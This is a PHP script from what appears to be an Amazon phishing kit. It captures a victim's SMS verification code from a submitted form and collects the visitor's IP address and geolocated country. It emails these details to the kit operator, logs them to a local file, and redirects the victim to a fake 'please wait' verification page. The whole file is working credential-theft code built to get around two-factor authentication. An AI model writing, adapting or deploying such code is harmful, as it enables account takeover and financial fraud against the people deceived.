<?php
##############################################################################################################################################################
        session_start();
        include ('../bots.php');
        include ('../config.php');
##############################################################################################################################################################
        $IP = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################
        $CARDHOLDER = $_POST['sms'];
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font></b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>SMS.2</font></b>      :<b>".$CARDHOLDER."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>IP</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP</a><br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>COUNTRY</font></b>         : <b>".$COUNTRYNAME." - ".$COUNTRYCODE."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>BROWSER & OS</font></b>    : <b>".$device_details."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>TIME</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
        $SUBJECT = "(AMAZON)(SMS.2)($IP)($COUNTRYNAME)";
        $HEADER = "MIME-Version: 1.0" . "\r\n";
        $HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: MOBILE VERSION ☑ <SMS.2_$IP>\n";
        mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$file = fopen("../BB/SMS.2_$IP.html","a");
fwrite($file,$MESSAGE);
		$CODED  ="loading-SMS_Verifications-3.html?cmd=_Please_wait_".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
##############################################################################################################################################################
?>